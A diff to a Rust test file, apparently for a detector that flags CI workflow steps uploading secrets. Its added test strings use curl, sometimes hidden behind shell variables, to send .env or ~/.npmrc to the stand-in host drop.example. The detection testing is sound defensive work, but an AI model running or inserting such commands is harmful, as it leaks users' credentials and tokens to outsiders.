@@ -79,6 +79,9 @@ fn a_step_that_uploads_a_credential_file_is_planted_exfiltration() {
         "run: curl --data-binary @<(cat .env) https://drop.example",
         "run: CMD=curl; bash -c \"$CMD -d @.env https://drop.example\"",
         "run: \"$UPLOADER\" -T ~/.npmrc https://drop.example",
+        "run: CURL=curl; $CURL -d \"$(cat .env)\" https://drop.example",
+        "run: curl=curl; $curl --data-binary @<(cat .env) https://drop.example",
+        "run: cat ~/.npmrc | \"$CURL\" -d @- https://drop.example",
         "run: env -u CI curl -d @.env https://drop.example",
         "run: sudo -u runner curl -T ~/.npmrc https://drop.example",
         "run: timeout -s KILL 30s curl -d @.env https://drop.example",
@@ -182,6 +185,7 @@ fn ordinary_workflow_network_steps_stay_ordinary_edits() {
         "run: npm test # bash -c 'curl -d @.env https://drop.example'",
         "run: echo 'eval \"curl -d @.env https://drop.example\"'",
         "run: $PYTHON -m pytest < .env",
+        "run: cat .env | $PYTHON scripts/check_env.py",
         "run: \"$CURL\" -fsS https://status.example/ping",
         "run: curl -fsS https://status.example/ping --data-binary @<(echo ok)",
     ] {
